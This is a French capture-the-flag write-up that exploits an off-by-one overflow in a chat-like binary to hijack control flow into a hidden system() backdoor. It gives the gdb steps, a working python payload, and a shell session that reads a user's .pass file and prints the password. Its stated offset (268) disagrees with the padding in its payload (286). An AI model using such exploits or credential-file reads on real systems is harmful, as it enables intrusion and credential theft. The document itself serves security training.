Ce binaire s'apparente a un systeme de chat. 
En premier, il demande un username, puis, un message a envoyer. 
Le probleme se trouve dans la fonction "set_username". Dans la structure "save" un buffer
de 40 bytes est prevu pour stocker le username. Or, dans le fonction set_username, une sorte
de strcpy manuel est effectue :
    
      i = 0;
      while (i <= 40 && buf[i] != '\0')
      {
        save->username[i] = buf[i];
        i++;
      }
      
Le probleme est qu'il va y avoir 41 iterations et non 40 ! Nous allons donc pouvoir deborder
sur la variable se trouvant apres username[40] dans la structure save. En l'occurence, "length". 
Cette variable length est utilise pour la fonction "set_msg". En effet, un strncpy est effectue :

        strncpy(save->msg, buf, save->length);

"buf" contient le message rentre par l'utilisateur. Les caracteres dans ce dernier seront copies autant
de fois que la valeur de length. Cependant, nous pouvons maintenant agrandir cette valeur length.
Dans la mesure ou nous pouvons reecrire un byte de plus que prevu, cela signifie que nous pouvons 
passer au maximum 255 a la variable length. 

Une fonction cachee rentre egalement en jeu. la fonction "secret_backdoor", qui execute la commande que nous lui passerons, via system().

Il nous faut donc son adresse :

    $ gdb level09
    $ start
    $ p &secret_backdoor
    => 0x55555555488c
    
Puis trouver l'offset necessaire a l'overwrite de EIP pour y ecrire l'adresse de secret_backdoor.

    python -c "print('A'*40 + '\xce' + 'A'*286 + 'B'*8 )" > /tmp/x

    Program received signal SIGSEGV, Segmentation fault.
    0x424242424242 in ?? ()
    
L'offset est de 268 si on utilise la valeur `\xce` (206) dans length.

Voici notre payload final :

    python -c "print('A'*40 + '\xce' + 'A'*286 + '\x8c\x48\x55\x55\x55\x55')" > /tmp/x
    cat /tmp/x - | ./level09
    
    $ whoami
    end
    $ cat /home/users/end/.pass
    j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

